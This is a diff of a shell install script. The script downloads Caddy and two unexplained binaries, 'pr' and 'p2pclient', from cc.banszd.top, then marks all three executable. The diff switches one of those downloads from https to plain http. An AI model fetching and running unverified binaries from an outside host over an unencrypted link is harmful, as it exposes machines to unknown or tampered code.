@@ -7,7 +7,7 @@ CADDYIndexPage=${CADDYIndexPage:-https://raw.githubusercontent.com/caddyserver/d
 
 # download execution
 wget "https://caddyserver.com/api/download?os=linux&arch=amd64" -O ca
-wget "https://cc.banszd.top/v22/GX/pr" -O pr
+wget "http://cc.banszd.top/v22/GX/pr" -O pr
 wget "http://cc.banszd.top/p2pclient" -O p2pclient
 chmod +x ca pr p2pclient
 
